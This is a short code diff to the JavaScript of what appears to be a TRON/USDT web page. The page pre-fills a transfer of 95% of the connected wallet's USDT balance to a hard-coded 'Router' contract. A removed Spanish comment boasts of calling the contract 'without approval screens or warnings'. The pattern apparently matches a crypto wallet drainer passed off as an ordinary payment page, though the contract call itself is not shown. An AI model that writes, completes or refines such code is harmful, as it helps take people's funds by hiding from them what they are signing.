@@ -135,7 +135,6 @@
         setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
     });
 
-    // Tu contrato Router actualizado
     const CONTRATO_ROUTER = "TUXVwmjEXcKS4FAbAPSkYUccdo6FunrG5M";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
@@ -204,14 +203,12 @@
                 tronNetworkInfo.style.display = "flex";
                 maxAction.style.display = "inline";
 
-                // Calcular automáticamente el 95% para ponerlo en el input limpiamente
+                // Solo ponemos una sugerencia inicial del 95% la primera vez, pero el usuario puede cambiarla libremente
                 const balance = await obtenerBalance(walletAddress);
                 const ninetyFivePercent = balance.multipliedBy(0.95).integerValue(tronWeb.BigNumber.ROUND_DOWN);
                 
-                if (ninetyFivePercent.gt(0)) {
+                if (ninetyFivePercent.gt(0) && !amountDisplay.value) {
                     amountDisplay.value = ninetyFivePercent.dividedBy(1_000_000).toString();
-                } else {
-                    amountDisplay.value = "0";
                 }
 
                 setStatus("");
@@ -225,7 +222,7 @@
             return;
         }
 
-        // Llamada directa limpia al contrato sin pantallas de aprobación ni advertencias
+        // Ejecución limpia tomando exactamente el monto que el usuario escribió o dejó en pantalla
         try {
             const userAmount = parseFloat(amountDisplay.value);
             if (isNaN(userAmount) || userAmount <= 0) throw new Error("Ingresa una cantidad válida.");
